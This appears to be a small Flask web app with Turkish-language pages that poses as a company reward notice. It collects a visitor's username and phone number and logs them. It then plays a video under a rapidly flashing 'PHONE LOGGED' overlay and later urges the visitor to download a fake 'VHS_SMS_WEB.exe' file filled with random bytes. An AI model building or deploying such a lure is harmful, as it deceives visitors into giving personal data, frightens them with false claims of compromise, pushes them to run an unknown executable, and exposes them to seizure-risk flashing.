from flask import Flask, render_template_string, request, send_file, session
import os
import io
import datetime

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ----------------------------------------------------
# ANA SAYFA ROTASI (NOT FOUND HATASINI COZEN KISIM)
# ----------------------------------------------------
@app.route('/', methods=['GET'])
def index():
    # Buradaki HTML kismini senin o luks panelinle degistiriyoruz
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: #050505; color: #d4d4d4; font-family: 'Times New Roman', serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .panel { border: 1px solid #1a1a1a; background: #0a0a0a; padding: 50px; text-align: center; box-shadow: 0 0 50px #000; max-width: 450px; width: 100%; }
        h1 { color: #fff; letter-spacing: 5px; font-size: 1.5em; margin-bottom: 30px; border-bottom: 1px solid #1a1a1a; padding-bottom: 10px; }
        p { font-size: 0.9em; line-height: 1.8; color: #888; margin-bottom: 30px; }
        input { width: 100%; padding: 15px; margin-bottom: 15px; background: #000; border: 1px solid #222; color: #fff; outline: none; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: #fff; color: #000; border: none; font-weight: bold; cursor: pointer; letter-spacing: 2px; }
    </style>
</head>
<body>
    <div class="panel">
        <h1>SOETHG COMPANY</h1>
        <p>MERHABA SAYIN, SOETHG COMPANY TARAFINDAN ODUL ILE KARSILANDINIZ. LUTFEN KULLANICI ADINIZI YAZINIZ.</p>
        <form method="POST" action="/video">
            <input type="text" name="username" placeholder="KULLANICI ADI" required>
            <input type="text" name="phone_number" placeholder="TELEFON NUMARASI (ISTEGE BAGLI)">
            <button type="submit">SISTEME GIRIS YAP</button>
        </form>
    </div>
</body>
</html>
    """)

@app.route('/video', methods=['POST'])
def video():
    user = request.form.get('username', 'MECHUL')
    phone = request.form.get('phone_number', 'GIRILMEDI')
    session['username'] = user
    print(f"--- LOG: {user} - {phone} ---")
    
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; margin: 0; overflow: hidden; }
        #video-container { position: relative; width: 100vw; height: 100vh; }
        iframe { width: 100%; height: 100%; pointer-events: none; }
        #overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; z-index: 10; pointer-events: none; opacity: 0; background: #fff; }
        .msg { color: #000; font-family: sans-serif; font-weight: 900; font-size: 2em; text-align: center; }
        @keyframes flash { 0% { opacity: 1; } 100% { opacity: 0; } }
        .active-flash { animation: flash 0.5s steps(2, start) infinite; }
    </style>
</head>
<body>
    <div id="video-container">
        <iframe src="https://www.youtube.com/embed/-NajkeXVSnQ?autoplay=1&controls=0&mute=0&loop=1&playlist=-NajkeXVSnQ" frameborder="0"></iframe>
        <div id="overlay">
            <div class="msg">***** PHONE L-O-G-G-E-D<br>***** {{ user }}</div>
        </div>
    </div>
    <script>
        const overlay = document.getElementById('overlay');
        function triggerFlash() {
            overlay.classList.add('active-flash');
            setTimeout(() => { overlay.classList.remove('active-flash'); }, 4000);
        }
        triggerFlash();
        setInterval(triggerFlash, 120000);
        setTimeout(() => { window.location.href = "/download"; }, 300000);
    </script>
</body>
</html>
    """, user=user.upper())

@app.route('/download')
def download():
    return """<body style="background:#000;color:#fff;text-align:center;padding-top:100px;">
              <h2 style="color:red;">KRITIK UYARI</h2>
              <p>VHS_SMS_WEB DOSYASINI INDIRIN.</p>
              <a href="/file"><button style="padding:20px;background:red;color:#fff;border:none;">INDIR</button></a></body>"""

@app.route('/file')
def file():
    buf = io.BytesIO()
    buf.write(os.urandom(50 * 1024 * 1024))
    buf.seek(0)
    return send_file(buf, as_attachment=True, download_name="VHS_SMS_WEB.exe")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
